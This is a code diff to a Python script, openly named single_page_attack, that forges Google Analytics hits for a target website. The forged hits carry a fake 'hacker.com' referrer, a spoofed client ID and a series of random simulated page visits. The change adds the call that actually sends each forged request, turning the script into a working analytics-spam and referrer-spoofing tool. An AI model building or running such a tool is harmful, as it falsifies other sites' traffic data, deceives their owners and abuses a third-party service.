@@ -18,7 +18,7 @@ def main():
     #     test.append(result)
     # print test
 
-    test = single_page_attack(target_url='http://zonksec.com',referral_url='http://hacker.com',client_id=402,bounces=100)
+    test = single_page_attack(target_url='http://zonksec.com',referral_url='http://hacker.com',client_id=402,bounces=3)
     print len(test.bounce_urls)
     #test.run()
 class single_page_attack:
@@ -52,6 +52,7 @@ class single_page_attack:
         while (bounce_count < self.bounces):
             time.sleep(self.page_delay)
             bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=self.client_id)
+            bounce_request.send()
             last_page = bounce_request.document_location
             bounce_count += 1
 
@@ -87,7 +88,8 @@ class analytics_request:
         params['ua'] = self.user_agent
 
         r = requests.post('https://www.google-analytics.com/collect', data=params)
-        print(r)
+        print('request sent. param:')
+        print(params)
 
 
 main()
